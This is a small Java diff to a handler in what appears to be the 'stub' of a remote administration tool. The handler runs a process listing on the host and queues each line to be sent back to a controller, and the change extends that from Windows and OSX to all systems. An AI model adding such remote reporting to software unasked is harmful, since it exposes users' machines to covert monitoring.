@@ -5,7 +5,8 @@ import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet20Process;
 
 
 public class PacketLISTPROCESS extends AbstractIncomingPacket {
@@ -27,11 +28,11 @@ public class PacketLISTPROCESS extends AbstractIncomingPacket {
 				
 				while ((line = input.readLine()) != null) {
 					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-						if (!line.trim().equals("")) {
-							Connection.addToSendQueue(new PacketBuilder(Header.PROCESS, line));
+						if (line.trim().length() > 0) {
+							Connection.addToSendQueue(new Packet20Process(line));
 						}
-					} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-						Connection.addToSendQueue(new PacketBuilder(Header.PROCESS, line));
+					} else {
+						Connection.addToSendQueue(new Packet20Process(line));
 					}
 				}
 				input.close();
